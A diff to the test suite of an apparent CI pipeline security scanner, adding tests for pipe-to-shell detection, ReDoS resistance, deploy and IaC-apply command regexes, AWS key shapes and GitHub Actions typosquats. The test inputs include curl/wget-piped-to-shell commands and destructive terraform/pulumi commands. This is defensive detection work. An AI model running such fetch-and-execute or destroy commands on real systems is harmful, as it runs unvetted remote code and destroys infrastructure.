@@ -10,6 +10,8 @@ loading round-trip.
 """
 from __future__ import annotations
 
+import time
+
 import pytest
 
 from pipeline_check.core.checks._primitives import (
@@ -24,6 +26,7 @@ from pipeline_check.core.checks._primitives import (
     shell_eval,
     tainted_variables,
     tls_bypass,
+    top_actions,
 )
 
 # ──────────────────────────────────────────────────────────────────
@@ -569,6 +572,63 @@ class TestRemoteScriptExecNegatives:
         assert remote_script_exec.scan(text) == []
 
 
+class TestSimplePipeToShell:
+    """The lightweight command-scoped matcher shared by drone DR-014 and
+    harness HARNESS-005. Broader interpreter set than a bare sh/bash so
+    ``| python`` and ``| sudo bash`` don't slip through, but URL-agnostic
+    (a piped ``$URL`` variable still fires) and keeps the BSD ``fetch``."""
+
+    @pytest.mark.parametrize("cmd", [
+        "curl -fsSL https://e.x/i.sh | sh",
+        "wget -qO- https://e.x/i.sh | bash",
+        "curl $URL | python3",
+        "curl https://e.x/i | sudo bash",
+        "fetch https://e.x/i.pl | perl",
+    ])
+    def test_pipe_to_interpreter_matches(self, cmd):
+        assert remote_script_exec.SIMPLE_PIPE_TO_SHELL_RE.search(cmd)
+
+    @pytest.mark.parametrize("cmd", [
+        "curl -fsSL https://e.x/x.tar.gz -o x.tar.gz",  # download only
+        "curl https://e.x/x | tee /tmp/x.log",          # non-interpreter
+    ])
+    def test_non_interpreter_not_matched(self, cmd):
+        assert not remote_script_exec.SIMPLE_PIPE_TO_SHELL_RE.search(cmd)
+
+
+class TestRemoteScriptExecReDoS:
+    """A crafted long line must not drive the patterns into quadratic
+    backtracking. Each fill is length-capped (``_MAX_FILL``); before the
+    cap an 80k-char line backtracked ~5 s per pattern, a denial-of-service
+    vector since these run on PR-controlled CI files.
+    """
+
+    # Fetcher + URL prefix with no trailing pipe / paren / redirect: the
+    # shape that maximized backtracking for each catalog entry. The long
+    # tail is appended inside the test so the parametrize id stays small.
+    @pytest.mark.parametrize("prefix", [
+        "curl https://x.io/",             # pipe / download-exec
+        'bash -c "$(curl https://x.io/',  # shell-subshell
+        "bash <(curl https://x.io/",      # process-subst
+        "irm https://x.io/",              # powershell
+    ])
+    def test_long_line_does_not_backtrack(self, prefix):
+        payload = prefix + "a" * 80000
+        start = time.perf_counter()
+        remote_script_exec.scan(payload)
+        elapsed = time.perf_counter() - start
+        # Post-fix is ~15 ms; the 1 s bar catches the ~5 s regression
+        # with a wide margin for slow CI without flaking.
+        assert elapsed < 1.0, f"scan took {elapsed:.2f}s (ReDoS regression)"
+
+    def test_cap_preserves_detection_within_bound(self):
+        # A long-but-bounded URL (under ``_MAX_FILL``) still matches; the
+        # cap only defuses the adversarial unbounded case.
+        url = "https://example.com/" + "a" * 1000
+        hits = remote_script_exec.scan(f"curl {url} | bash")
+        assert len(hits) == 1 and hits[0].kind == "curl-pipe"
+
+
 # ──────────────────────────────────────────────────────────────────
 # tls_bypass
 # ──────────────────────────────────────────────────────────────────
@@ -739,23 +799,115 @@ class TestDeployNames:
         "test",
         "lint",
         "compile",
-        # Words that *contain* deploy as a substring but on a word
-        # boundary they don't — \b in the regex prevents this.
-        "redeployer",  # \bdeploy\b doesn't match because of preceding 're'
+        # Words that *contain* a keyword but are letter-adjacent on one
+        # side, so the not-a-letter lookarounds prevent a match.
+        "redeployer",   # 'deploy' preceded by 're'
+        "deployment",   # 'deploy' followed by 'ment'
+        "builddeploy",  # 'deploy' preceded by 'build'
     ])
     def test_unrelated_names_dont_match(self, name):
         assert deploy_names.DEPLOY_RE.search(name) is None
 
-    def test_underscore_separated_names_do_not_match(self):
-        """Python's ``\\b`` treats ``_`` as a word character, so
-        ``deploy_to_prod`` does NOT match the primitive's regex even
-        though autofix.py's looser ``_DEPLOY_NAME_RE`` does.
+    @pytest.mark.parametrize("name", [
+        "deploy_to_prod",
+        "deploy_prod",
+        "prod_deploy",
+        "release_prod",
+        "publish_npm",
+    ])
+    def test_underscore_separated_names_match(self, name):
+        """``_`` is a word char, so the old ``\\b`` regex missed the
+        dominant CI naming form. The lookaround form treats ``_`` /
+        ``-`` / whitespace as delimiters and matches these, while
+        letter-adjacent forms (``deployment``, ``builddeploy``) stay
+        unmatched (covered by ``test_unrelated_names_dont_match``)."""
+        assert deploy_names.DEPLOY_RE.search(name) is not None
 
-        Callers that want to catch underscore-suffixed deploy names
-        must either split on ``_`` first or use their own regex —
-        the primitive prefers the false-negative over the false-
-        positive (``builddeploy`` would otherwise hit too)."""
-        assert deploy_names.DEPLOY_RE.search("deploy_to_prod") is None
+    @pytest.mark.parametrize("cmd", [
+        "kubectl apply -f k8s/",
+        "terraform apply -auto-approve",
+        "aws s3 sync ./dist s3://prod",
+        "aws cloudformation deploy --stack-name x",
+        "aws ecs update-service --service x",
+        # The shared catalog now carries the Lambda code-deploy verb, so
+        # every deploy-gating rule that imports DEPLOY_CMD_RE picks it up.
+        "aws lambda update-function-code --function-name x",
+        "docker push registry/app:tag",
+        "helm upgrade app ./chart",
+        "gcloud run deploy svc",
+        "serverless deploy",
+        "az webapp deploy",
+    ])
+    def test_deploy_command_matches(self, cmd):
+        assert deploy_names.DEPLOY_CMD_RE.search(cmd) is not None
+
+    @pytest.mark.parametrize("cmd", [
+        "terraform plan",
+        "kubectl get pods",
+        "aws s3 ls",
+        "docker build -t app .",
+        "echo deploying",
+    ])
+    def test_non_deploy_command_does_not_match(self, cmd):
+        assert deploy_names.DEPLOY_CMD_RE.search(cmd) is None
+
+    @pytest.mark.parametrize("env", [
+        "production",
+        "prod",
+        "Production",
+        "PROD",
+        "prod-eu",
+        "production_us",
+        "prod/$CI_COMMIT_REF_NAME",
+    ])
+    def test_production_env_names_match(self, env):
+        assert deploy_names.PROD_ENV_RE.match(env) is not None
+
+    @pytest.mark.parametrize("env", [
+        "product-tests",
+        "preprod",
+        "non-prod",
+        "staging",
+        "test",
+        "review/feature-x",
+    ])
+    def test_non_production_env_names_do_not_match(self, env):
+        assert deploy_names.PROD_ENV_RE.match(env) is None
+
+    @pytest.mark.parametrize("cmd", [
+        "terraform apply -auto-approve",
+        "terraform destroy",
+        "terragrunt run-all apply",
+        # OpenTofu is a Terraform fork; the catalog covers it so every
+        # IaC-apply rule (GHA-117, GL-041, BB-033, GHA-111) recognizes it.
+        "tofu apply",
+        "tofu destroy",
+        "aws cloudformation deploy --stack-name x",
+        "aws cloudformation create-stack --stack-name x",
+        "cdk deploy",
+        "cdk destroy",
+        "pulumi up --yes",
+        "pulumi destroy",
+        "sam deploy",
+        # ``-chdir=DIR`` (the standard CI way to target a non-root module)
+        # sits between the tool name and the subcommand; it must not break
+        # the match, or all five IaC-apply-on-untrusted-trigger rules bypass.
+        "terraform -chdir=infra apply -auto-approve",
+        "tofu -chdir=./env/prod destroy",
+        "terragrunt -chdir=stacks run-all apply",
+    ])
+    def test_iac_apply_matches(self, cmd):
+        assert deploy_names.IAC_APPLY_RE.search(cmd) is not None
+
+    @pytest.mark.parametrize("cmd", [
+        # Read-only IaC verbs are deliberately excluded.
+        "terraform plan",
+        "cdk diff",
+        "pulumi preview",
+        "terraform validate",
+    ])
+    def test_iac_read_only_does_not_match(self, cmd):
+        assert deploy_names.IAC_APPLY_RE.search(cmd) is None
 
 
 # ──────────────────────────────────────────────────────────────────
@@ -767,7 +919,7 @@ class TestSecretShapes:
     @pytest.mark.parametrize("text", [
         "AKIA" + "A" * 16,
         "AKIA1234567890123456",
-        "value: AKIAIOSFODNN7EXAMPLE",
+        "value: AKIAZ3MHALF2TESTHIJK",
     ])
     def test_aws_key_shape_matches(self, text):
         assert secret_shapes.AWS_KEY_RE.search(text) is not None
@@ -1173,3 +1325,120 @@ class TestOciImageAnchor:
 
     def test_empty_string_rejected(self):
         assert anchors.oci_image("") is None
+
+
+# ──────────────────────────────────────────────────────────────────
+# top_actions (typosquat classifier)
+# ──────────────────────────────────────────────────────────────────
+
+
+class TestTopActionsFindTyposquat:
+    def test_exact_match_returns_none(self):
+        # The canonical action is never a typosquat of itself.
+        assert top_actions.find_typosquat("actions/checkout") is None
+
+    def test_case_folded_exact_match_returns_none(self):
+        assert top_actions.find_typosquat("ACTIONS/Checkout") is None
+
+    def test_distance_one_zero_for_o(self):
+        # ``check0ut`` swaps ``o`` for ``0``.
+        assert (
+            top_actions.find_typosquat("actions/check0ut")
+            == "actions/checkout"
+        )
+
+    def test_distance_one_missing_letter(self):
+        assert (
+            top_actions.find_typosquat("actons/checkout")
+            == "actions/checkout"
+        )
+
+    def test_distance_one_extra_letter(self):
+        assert (
+            top_actions.find_typosquat("actions/checkouts")
+            == "actions/checkout"
+        )
+
+    def test_distance_one_transposition(self):
+        # Damerau handles single adjacent transpositions as one edit.
+        assert (
+            top_actions.find_typosquat("actions/cehckout")
+            == "actions/checkout"
+        )
+
+    def test_distance_two_fires(self):
+        # Two edits relative to ``actions/checkout``.
+        assert top_actions.find_typosquat("actins/checkoutt") is not None
+
+    def test_distance_three_silent(self):
+        # Three or more edits, outside the default ceiling of 2.
+        assert top_actions.find_typosquat("actoons/chekot") is None
+
+    def test_unknown_action_silent(self):
+        assert top_actions.find_typosquat("acme-corp/internal-deploy") is None
+
+    def test_empty_slug_silent(self):
+        assert top_actions.find_typosquat("") is None
+
+    def test_max_distance_override(self):
+        # max_distance=1 rejects the distance-2 squat.
+        assert top_actions.find_typosquat(
+            "actins/checkoutt", max_distance=1,
+        ) is None
+
+    def test_owner_swap_silent(self):
+        # ``actions-checkout/checkout`` vs ``actions/checkout``: owner
+        # rename, distance 9 on the full slug, outside the ceiling.
+        # This is repojacking territory (GHA-082 when it ships), not
+        # typosquat.
+        assert (
+            top_actions.find_typosquat("actions-checkout/checkout")
+            is None
+        )
+
+    def test_top_actions_list_is_sorted_case_insensitively(self):
+        # Lock the curated list's alphabetical ordering so future
+        # additions land in the right slot.
+        lowered = [a.lower() for a in top_actions.TOP_ACTIONS]
+        assert lowered == sorted(lowered)
+
+
+# ──────────────────────────────────────────────────────────────────
+# secret_shapes — vendor-example + placeholder suppression helpers
+# ──────────────────────────────────────────────────────────────────
+
+
+class TestSecretShapesAwsKeyIn:
+    def test_real_key_returned(self):
+        assert (
+            secret_shapes.aws_key_in("AKIAZ3MHALF2TESTHIJK")
+            == "AKIAZ3MHALF2TESTHIJK"
+        )
+
+    def test_vendor_example_suppressed(self):
+        # AWS's documented dummy key is a doc artifact, never a real
+        # credential — it must not be reported as an AWS key.
+        assert secret_shapes.aws_key_in("AKIAIOSFODNN7EXAMPLE") is None
+
+    def test_no_key_returns_none(self):
+        assert secret_shapes.aws_key_in("not a key") is None
+
+    def test_non_string_returns_none(self):
+        assert secret_shapes.aws_key_in(None) is None
+        assert secret_shapes.aws_key_in(1234) is None
+
+
+class TestSecretShapesPlaceholder:
+    @pytest.mark.parametrize(
+        "value",
+        ["REPLACE_ME", "changeme", "<your-token>", "PLACEHOLDER", "XXXXX"],
+    )
+    def test_placeholders_detected(self, value):
+        assert secret_shapes.is_placeholder_value(value) is True
+
+    @pytest.mark.parametrize("value", ["hunter2supersecret", "", "prod-db-01"])
+    def test_real_values_not_placeholders(self, value):
+        assert secret_shapes.is_placeholder_value(value) is False
+
+    def test_non_string_is_not_placeholder(self):
+        assert secret_shapes.is_placeholder_value(None) is False
